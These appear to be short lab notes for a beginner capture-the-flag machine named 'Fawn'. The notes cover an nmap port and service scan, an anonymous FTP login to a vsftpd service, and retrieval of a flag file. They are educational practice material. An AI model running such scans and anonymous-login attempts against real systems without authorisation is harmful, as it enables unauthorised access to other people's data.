# Fawn — Lab Notes

## Target
IP: <TARGET_IP>

---

# Recon

nmap -p- -sS -T4 --min-rate 1000 <TARGET_IP>

Result:
21/tcp open ftp

---

# Service Scan

nmap -sV -p 21 <TARGET_IP>

Service:
vsftpd

---

# Exploitation

ftp <TARGET_IP>

Name: anonymous
Password: anonymous

Login successful.

ls
get flag.txt

Flag retrieved.
